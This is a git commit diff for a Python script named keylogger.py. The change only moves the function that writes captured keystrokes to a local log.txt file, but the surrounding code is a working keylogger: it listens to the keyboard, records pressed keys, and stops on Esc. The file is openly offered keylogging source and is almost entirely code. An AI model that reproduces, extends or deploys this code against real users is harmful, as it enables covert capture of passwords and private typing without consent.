336ee449abf7d8f6c3e7476fa01c378e70300ccf
Abhay Kumar Singh <abskumar798@gmail.com>
2021-07-30 04:42:31 +0530

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -17,18 +17,18 @@ def on_press(key):
         write_file(keys)
         keys = []
 
+def write_file(keys):
+    with open("log.txt", "a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k.find('space') > 0: 
+                f.write('\n')
+            elif k.find("Key") == -1:            
+                f.write(k)
+
 def on_release(key):
     if key == Key.esc:
         return False
         
-def write_file(keys):
-    with open('log.txt', 'a') as f:
-        for key in keys:
-            k = str(key).replace("'", "")
-            if k.find('space') > 0: 
-                f.write('\n')
-            elif k.find('Key') == -1:            
-                f.write(k)
-
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
